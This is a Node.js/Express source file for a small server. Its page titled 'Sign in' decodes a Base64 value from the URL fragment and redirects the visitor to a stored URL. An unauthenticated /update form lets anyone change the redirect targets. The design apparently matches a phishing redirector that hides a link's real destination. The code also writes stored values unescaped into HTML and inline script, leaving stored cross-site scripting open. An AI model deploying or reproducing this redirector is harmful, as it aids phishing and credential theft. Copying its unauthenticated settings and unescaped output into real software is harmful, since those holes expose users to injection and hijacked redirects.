const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const bodyParser = require("body-parser");

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Initialize SQLite in-memory database
const db = new sqlite3.Database(":memory:", (err) => {
  if (err) {
    console.error("Error opening in-memory database:", err.message);
  } else {
    console.log("Connected to in-memory SQLite database.");
    db.run(
      `CREATE TABLE IF NOT EXISTS settings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        redirect_url TEXT,
        fallback_url TEXT
      )`,
      (err) => {
        if (err) {
          console.error("Error creating table:", err.message);
        } else {
          // Insert default values
          db.run(
            `INSERT INTO settings (redirect_url, fallback_url)
             VALUES ('https://example.com/redirect#', 'https://example.com/fallback')`
          );
        }
      }
    );
  }
});

// Handle the base page (redirect logic)
app.get("/", (req, res) => {
  db.get("SELECT redirect_url, fallback_url FROM settings LIMIT 1", (err, row) => {
    if (err) {
      res.status(500).send("Error loading settings.");
    } else {
      const redirectUrl = row.redirect_url || "";
      const fallbackUrl = row.fallback_url || "";

      // Send client-side JavaScript to handle the redirection
      res.send(`
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>Sign in</title>
   </head>
   <body>
      <script>
         // Extract the Base64-encoded fragment from the URL
         const base64Data = window.location.hash.substring(1); // Get everything after '#'
         if (base64Data) {
            try {
               // Decode the Base64 string
               const decodedData = atob(base64Data);
               // Redirect to the full redirect URL with the decoded data
               window.location.href = "${redirectUrl}" + decodedData;
            } catch (error) {
               console.error("Error decoding Base64:", error);
               // Redirect to the fallback URL if decoding fails
               window.location.href = "${fallbackUrl}";
            }
         } else {
            // Redirect to the fallback URL if no fragment is provided
            window.location.href = "${fallbackUrl}";
         }
      </script>
   </body>
</html>
      `);
    }
  });
});

// Render the update page (GET /update)
app.get("/update", (req, res) => {
  db.get("SELECT redirect_url, fallback_url FROM settings LIMIT 1", (err, row) => {
    if (err) {
      res.status(500).send("Error loading settings.");
    } else {
      const redirectUrl = row ? row.redirect_url : "";
      const fallbackUrl = row ? row.fallback_url : "";

      res.send(`
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>Update Redirect Settings</title>
   </head>
   <body>
      <h2>Update Redirect Settings</h2>
      <form method="POST" action="/update">
         <label for="redirectUrl">Redirect URL:</label>
         <input
            type="text"
            id="redirectUrl"
            name="redirectUrl"
            value="${redirectUrl}"
            placeholder="Enter new redirect URL"
            style="width: 100%; padding: 10px; margin: 10px 0;"
         />
         <label for="fallbackUrl">Default Fallback URL:</label>
         <input
            type="text"
            id="fallbackUrl"
            name="fallbackUrl"
            value="${fallbackUrl}"
            placeholder="Enter new fallback URL"
            style="width: 100%; padding: 10px; margin: 10px 0;"
         />
         <button type="submit" style="padding: 10px 20px;">Save Changes</button>
      </form>
   </body>
</html>
      `);
    }
  });
});

// Handle form submissions to update settings (POST /update)
app.post("/update", (req, res) => {
  const { redirectUrl, fallbackUrl } = req.body;

  db.run(
    `UPDATE settings SET redirect_url = ?, fallback_url = ?`,
    [redirectUrl, fallbackUrl],
    function (err) {
      if (err) {
        res.status(500).send("Error updating settings.");
      } else {
        res.send(`
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>Settings Updated</title>
   </head>
   <body>
      <h2>Settings Updated Successfully</h2>
      <p>Redirect URL: ${redirectUrl}</p>
      <p>Fallback URL: ${fallbackUrl}</p>
      <a href="/">Go Back</a>
   </body>
</html>
        `);
      }
    }
  );
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});